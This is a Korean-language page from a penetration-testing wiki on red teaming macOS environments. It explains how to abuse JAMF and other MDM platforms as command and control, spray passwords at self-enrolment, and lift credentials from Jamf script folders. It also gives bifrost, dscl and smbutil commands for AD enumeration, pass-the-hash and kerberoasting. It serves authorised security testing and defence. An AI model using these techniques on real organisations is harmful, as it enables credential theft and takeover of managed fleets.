# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## MDMs 악용

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

관리 플랫폼에 액세스할 수 있는 **admin credentials를 compromise**하면, malware를 컴퓨터에 배포하여 **모든 컴퓨터를 잠재적으로 compromise**할 수 있습니다.

MacOS 환경에서 red teaming을 수행하려면 MDM이 어떻게 작동하는지 어느 정도 이해하는 것이 매우 권장됩니다:


{{#ref}}
macos-mdm/
{{#endref}}

### MDM을 C2로 사용

MDM은 profiles를 설치, 조회 또는 제거하고, applications를 설치하며, local admin accounts를 생성하고, firmware password를 설정하고, FileVault key를 변경할 수 있는 권한을 가집니다...

자체 MDM을 실행하려면 **CSR에 vendor의 서명을 받아야** 하며, [**https://mdmcert.download/**](https://mdmcert.download/)에서 이를 얻어볼 수 있습니다. Apple devices용 자체 MDM을 실행하려면 [**MicroMDM**](https://github.com/micromdm/micromdm)을 사용할 수 있습니다.

하지만 enrolled device에 application을 설치하려면 여전히 developer account로 서명되어 있어야 합니다... 그러나 MDM enrolment 과정에서 **device가 MDM의 SSL cert를 trusted CA로 추가**하므로 이제 무엇이든 서명할 수 있습니다.<sup>[4]</sup>

device를 MDM에 enrol하려면 root 권한으로 **`mobileconfig`** file을 설치해야 하며, 이는 **pkg** file을 통해 전달할 수 있습니다 (zip으로 압축할 수 있고 Safari에서 다운로드하면 압축이 해제됩니다).

**Mythic agent Orthrus**는 이 기법을 사용합니다.

### JAMF PRO 악용

JAMF는 **custom scripts** (sysadmin이 개발한 scripts), **native payloads** (local account 생성, EFI password 설정, file/process monitoring...) 및 **MDM** (device configurations, device certificates...)을 실행할 수 있습니다.<sup>[5]</sup>

#### JAMF self-enrolment

`https://<company-name>.jamfcloud.com/enroll/`과 같은 페이지로 이동하여 **self-enrolment가 활성화되어 있는지** 확인합니다. 활성화되어 있다면 **access를 위한 credentials를 요청할 수 있습니다**.

[**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) script를 사용하여 password spraying attack을 수행할 수 있습니다.

또한 유효한 credentials를 찾은 후에는 다음 form을 사용하여 다른 usernames를 brute-force할 수 있습니다:

![JAMF PRO 악용 - JAMF self-enrolment: 또한 유효한 credentials를 찾은 후에는 다음 form을 사용하여 다른 usernames를 brute-force할 수 있습니다](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** binary에는 keychain을 여는 secret이 포함되어 있었으며, 발견 당시 이 secret은 **모든 사람에게 공유**되고 있었고 값은 **`jk23ucnq91jfu9aj`**였습니다.<sup>[5]</sup>\
또한 jamf는 **`/Library/LaunchAgents/com.jamf.management.agent.plist`**에서 **LaunchDaemon**으로 **persist**합니다.

#### JAMF Device Takeover

**`jamf`**가 사용할 **JSS** (Jamf Software Server) **URL**은 **`/Library/Preferences/com.jamfsoftware.jamf.plist`**에 있습니다.\
이 file에는 기본적으로 URL이 포함되어 있습니다:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
따라서 공격자는 악성 패키지(`pkg`)를 배포하여 설치 시 **이 파일을 덮어쓰고**, **URL을 Typhon agent의 Mythic C2 listener로 설정**함으로써 JAMF를 C2로 악용할 수 있습니다.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

장치와 JMF 간의 **통신을 impersonate**하려면 다음이 필요합니다:

- 장치의 **UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- 다음 경로의 **JAMF keychain**: `/Library/Application\ Support/Jamf/JAMF.keychain` 여기에는 장치 인증서가 포함되어 있습니다.

이 정보를 사용하여 **탈취한** Hardware **UUID**로 **VM을 생성**하고 **SIP를 비활성화**한 뒤, **JAMF keychain을 복사하고**, Jamf **agent를 hook**하여 해당 정보를 탈취합니다.

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

또한 `/Library/Application Support/Jamf/tmp/` 위치를 모니터링할 수도 있습니다. 관리자가 Jamf를 통해 실행하려는 **custom scripts**가 이 위치에 **배치되고, 실행된 후 삭제**되기 때문입니다. 이러한 스크립트에는 **credentials**가 포함되어 있을 수 있습니다.

그러나 **credentials**가 **parameters**로 이러한 스크립트에 전달될 수도 있으므로, `ps aux | grep -i jamf`를 모니터링해야 합니다(root 권한이 없어도 가능).

[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) 스크립트는 새로 추가되는 파일과 새로운 process arguments를 수신 대기할 수 있습니다.

### macOS Remote Access

또한 MacOS의 "특수" **network** **protocols**에 대해서도 알아보세요:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

어떤 경우에는 **MacOS 컴퓨터가 AD에 연결**되어 있는 것을 확인할 수 있습니다. 이 시나리오에서는 평소 하던 것처럼 active directory를 **enumerate**해야 합니다. 다음 페이지에서 **도움말**을 확인하세요:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

도움이 될 수 있는 일부 **local MacOS tool**로 `dscl`도 있습니다:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
또한 MacOS에서 AD를 자동으로 열거하고 kerberos를 다룰 수 있도록 준비된 몇 가지 도구도 있습니다:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound는 MacOS 호스트에서 Active Directory 관계를 수집하고 수집한 데이터를 ingest할 수 있도록 Bloodhound audting 도구를 확장한 것입니다.<sup>[2]</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost는 macOS에서 Heimdal krb5 API와 상호 작용하도록 설계된 Objective-C 프로젝트입니다. 이 프로젝트의 목표는 대상에서 다른 framework나 package를 요구하지 않고 native API를 사용하여 macOS device의 Kerberos 관련 security testing을 개선하는 것입니다.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory enumeration을 수행하는 JavaScript for Automation (JXA) tool입니다.

### Domain Information
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### 사용자

MacOS 사용자는 다음 세 가지 유형으로 나뉩니다.

- **로컬 사용자** — 로컬 OpenDirectory service에서 관리되며, Active Directory에 어떤 방식으로도 연결되지 않습니다.
- **네트워크 사용자** — 인증을 위해 DC server에 연결해야 하는 휘발성 Active Directory 사용자입니다.
- **모바일 사용자** — 자격 증명과 파일을 로컬에 백업해 두는 Active Directory 사용자입니다.

사용자와 그룹에 대한 로컬 정보는 _/var/db/dslocal/nodes/Default._ 폴더에 저장됩니다.\
예를 들어 _mark_ 사용자에 대한 정보는 _/var/db/dslocal/nodes/Default/users/mark.plist_에 저장되고, _admin_ 그룹에 대한 정보는 _/var/db/dslocal/nodes/Default/groups/admin.plist_에 저장됩니다.

HasSession 및 AdminTo edges를 사용하는 것 외에도 **MacHound는 Bloodhound database에 세 가지 새로운 edges를 추가합니다**:<sup>[2]</sup>

- **CanSSH** - host에 SSH할 수 있는 entity
- **CanVNC** - host에 VNC할 수 있는 entity
- **CanAE** - host에서 AppleEvent scripts를 실행할 수 있는 entity
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
자세한 정보는 [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)에서 확인할 수 있습니다.

### Computer$ password

다음을 사용하여 password를 가져옵니다:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** password는 System keychain 내부에서 액세스할 수 있습니다.

### Over-Pass-The-Hash

특정 사용자 및 service에 대한 TGT를 가져옵니다:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGT를 획득한 후 다음을 사용하여 현재 세션에 주입할 수 있습니다:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
획득한 service tickets를 사용하면 다른 컴퓨터의 share에 액세스할 수 있습니다:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Keychain 접근

Keychain에는 민감한 정보가 포함되어 있을 가능성이 매우 높으며, prompt를 생성하지 않고 이에 접근할 수 있다면 red team exercise를 진행하는 데 도움이 될 수 있습니다:


{{#ref}}
macos-keychain.md
{{#endref}}

## External Services

MacOS Red Teaming은 일반적인 Windows Red Teaming과 다릅니다. 일반적으로 **MacOS는 여러 external platform과 직접 통합되어 있기 때문입니다**. MacOS의 일반적인 구성에서는 **OneLogin synchronised credentials를 사용해 컴퓨터에 접근하고, OneLogin을 통해 github, aws 등의 여러 external services에 접근**합니다.

## Misc Red Team techniques

### Safari

Safari에서 파일을 다운로드할 때 해당 파일이 "safe" 파일이면 **자동으로 열립니다**. 예를 들어 **zip을 다운로드하면** 자동으로 압축이 해제됩니다:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Gone Apple Pickin': Red Teaming MacOS Environments in 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Introducing MacHound: A Solution to macOS Active Directory Based Attacks](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: Turning macOS Management Evil](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
